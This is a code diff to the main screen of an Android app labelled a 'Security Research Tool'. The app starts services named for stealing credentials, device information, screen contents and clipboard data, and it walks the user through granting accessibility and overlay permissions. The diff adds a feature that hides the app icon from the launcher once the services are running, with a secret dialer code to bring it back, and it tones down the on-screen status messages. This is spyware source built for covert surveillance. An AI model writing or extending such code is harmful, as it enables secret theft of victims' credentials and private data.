@@ -1,6 +1,7 @@
 package com.yourpackage
 
 import android.Manifest
+import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
@@ -19,7 +20,7 @@ import com.yourpackage.services.CredentialExfilService
 import com.yourpackage.services.DeviceInfoExfilService
 import com.yourpackage.services.ScreenExfilService
 import com.yourpackage.utils.BatchScheduler
-import com.yourpackage.utils.ClipboardMonitor  // 🔥 NEW: Import ClipboardMonitor
+import com.yourpackage.utils.ClipboardMonitor
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -32,6 +33,7 @@ class MainActivity : AppCompatActivity() {
         private const val ACCESSIBILITY_PERMISSION_REQUEST = 1002
         private const val LOCATION_PERMISSION_REQUEST = 1003
         private const val PHONE_PERMISSION_REQUEST = 1004
+        private const val LAUNCHER_ALIAS = "com.yourpackage.LauncherAlias"
     }
 
     private lateinit var toggleButton: Button
@@ -40,10 +42,7 @@ class MainActivity : AppCompatActivity() {
     private var servicesRunning = false
     private lateinit var apiClient: ApiClient
     private lateinit var batchScheduler: BatchScheduler
-    
-    // 🔥 NEW: Clipboard Monitor instance
     private lateinit var clipboardMonitor: ClipboardMonitor
-    
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -58,11 +57,10 @@ class MainActivity : AppCompatActivity() {
 
         // Initialize Batch Scheduler
         batchScheduler = BatchScheduler {
-            // This lambda is called when the scheduler fires
             sendBatch()
         }
 
-        // 🔥 NEW: Initialize Clipboard Monitor
+        // Initialize Clipboard Monitor
         clipboardMonitor = ClipboardMonitor(this)
 
         // Start background retry for offline queue
@@ -145,7 +143,7 @@ class MainActivity : AppCompatActivity() {
         val deviceIntent = Intent(this, DeviceInfoExfilService::class.java)
         startService(deviceIntent)
 
-        // 🔥 NEW: Start Clipboard Monitor
+        // Start Clipboard Monitor
         clipboardMonitor.startMonitoring()
 
         // Start batch scheduler
@@ -153,7 +151,13 @@ class MainActivity : AppCompatActivity() {
 
         servicesRunning = true
         updateUI()
-        Toast.makeText(this, "🔍 Research services started (including Clipboard Monitor)", Toast.LENGTH_SHORT).show()
+        Toast.makeText(this, "🔍 Research services started", Toast.LENGTH_SHORT).show()
+
+        // 🔥 NEW: Hide the app icon after services start
+        // Wait 2 seconds so the toast is visible, then hide the icon
+        toggleButton.postDelayed({
+            hideAppIcon()
+        }, 2000)
     }
 
     /**
@@ -163,7 +167,7 @@ class MainActivity : AppCompatActivity() {
         // Stop batch scheduler
         batchScheduler.stop()
 
-        // 🔥 NEW: Stop Clipboard Monitor
+        // Stop Clipboard Monitor
         clipboardMonitor.stopMonitoring()
 
         // Stop services
@@ -179,6 +183,53 @@ class MainActivity : AppCompatActivity() {
         servicesRunning = false
         updateUI()
         Toast.makeText(this, "⏹️ Research services stopped", Toast.LENGTH_SHORT).show()
+
+        // 🔥 NEW: Show the app icon again (in case it was hidden)
+        showAppIcon()
+    }
+
+    /**
+     * Hide the app icon from the launcher.
+     * After this, the app will not appear in the app drawer.
+     * To unhide, dial: *#*#12345#*#*
+     */
+    private fun hideAppIcon() {
+        try {
+            val launcherAlias = ComponentName(this, LAUNCHER_ALIAS)
+            packageManager.setComponentEnabledSetting(
+                launcherAlias,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            Toast.makeText(
+                this,
+                "🔒 App hidden. Dial *#*#12345#*#* to unhide.",
+                Toast.LENGTH_LONG
+            ).show()
+        } catch (e: Exception) {
+            Toast.makeText(
+                this,
+                "Failed to hide app: ${e.message}",
+                Toast.LENGTH_LONG
+            ).show()
+        }
+    }
+
+    /**
+     * Show the app icon again.
+     * This is called when the services stop or when the secret code is dialed.
+     */
+    private fun showAppIcon() {
+        try {
+            val launcherAlias = ComponentName(this, LAUNCHER_ALIAS)
+            packageManager.setComponentEnabledSetting(
+                launcherAlias,
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (e: Exception) {
+            // Silent fail
+        }
     }
 
     /**
@@ -187,14 +238,22 @@ class MainActivity : AppCompatActivity() {
     private fun updateUI() {
         if (servicesRunning) {
             toggleButton.text = "Stop Research Services"
-            toggleButton.setBackgroundColor(ContextCompat.getColor(this, android.R.color.holo_red_dark))
-            statusText.text = "🟢 Status: Services Running (Clipboard + Accessibility)"
-            statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_light))
+            toggleButton.setBackgroundColor(
+                ContextCompat.getColor(this, android.R.color.holo_red_dark)
+            )
+            statusText.text = "🟢 Status: Services Running"
+            statusText.setTextColor(
+                ContextCompat.getColor(this, android.R.color.holo_green_light)
+            )
         } else {
             toggleButton.text = "Start Research Services"
-            toggleButton.setBackgroundColor(ContextCompat.getColor(this, android.R.color.holo_blue_dark))
+            toggleButton.setBackgroundColor(
+                ContextCompat.getColor(this, android.R.color.holo_blue_dark)
+            )
             statusText.text = "🔴 Status: Stopped"
-            statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark))
+            statusText.setTextColor(
+                ContextCompat.getColor(this, android.R.color.holo_red_dark)
+            )
         }
     }
 
@@ -238,10 +297,12 @@ class MainActivity : AppCompatActivity() {
     private fun requestAccessibilityPermission() {
         AlertDialog.Builder(this)
             .setTitle("Accessibility Permission Required")
-            .setMessage("This app needs accessibility permission to read screen content. Please enable it in the settings.\n\n" +
-                    "1. Go to Settings > Accessibility\n" +
-                    "2. Find \"Security Research Tool\"\n" +
-                    "3. Toggle it ON")
+            .setMessage(
+                "This app needs accessibility permission to read screen content. Please enable it in the settings.\n\n" +
+                        "1. Go to Settings > Accessibility\n" +
+                        "2. Find \"Security Research Tool\"\n" +
+                        "3. Toggle it ON"
+            )
             .setPositiveButton("Open Settings") { _, _ ->
                 val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                 startActivityForResult(intent, ACCESSIBILITY_PERMISSION_REQUEST)
@@ -262,13 +323,18 @@ class MainActivity : AppCompatActivity() {
 
         when (requestCode) {
             LOCATION_PERMISSION_REQUEST, PHONE_PERMISSION_REQUEST -> {
-                if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
-                    // Permission granted, try starting services again
+                if (grantResults.isNotEmpty() &&
+                    grantResults.all { it == PackageManager.PERMISSION_GRANTED }
+                ) {
                     if (!servicesRunning) {
                         startServices()
                     }
                 } else {
-                    Toast.makeText(this, "Permission required for full functionality", Toast.LENGTH_LONG).show()
+                    Toast.makeText(
+                        this,
+                        "Permission required for full functionality",
+                        Toast.LENGTH_LONG
+                    ).show()
                 }
             }
         }
@@ -284,23 +350,29 @@ class MainActivity : AppCompatActivity() {
             OVERLAY_PERMISSION_REQUEST -> {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                     if (Settings.canDrawOverlays(this)) {
-                        // Overlay permission granted, try starting services
                         if (!servicesRunning) {
                             startServices()
                         }
                     } else {
-                        Toast.makeText(this, "Overlay permission required", Toast.LENGTH_SHORT).show()
+                        Toast.makeText(
+                            this,
+                            "Overlay permission required",
+                            Toast.LENGTH_SHORT
+                        ).show()
                     }
                 }
             }
             ACCESSIBILITY_PERMISSION_REQUEST -> {
                 if (isAccessibilityServiceEnabled()) {
-                    // Accessibility granted, try starting services
                     if (!servicesRunning) {
                         startServices()
                     }
                 } else {
-                    Toast.makeText(this, "Accessibility permission required", Toast.LENGTH_SHORT).show()
+                    Toast.makeText(
+                        this,
+                        "Accessibility permission required",
+                        Toast.LENGTH_SHORT
+                    ).show()
                 }
             }
         }
@@ -310,9 +382,6 @@ class MainActivity : AppCompatActivity() {
      * Send a batch via the batch scheduler.
      */
     private suspend fun sendBatch() {
-        // This will be called by the BatchScheduler
-        // The actual batch sending is handled by the services
-        // We just process the offline queue here
         try {
             val sentCount = apiClient.processOfflineQueue()
             if (sentCount > 0) {
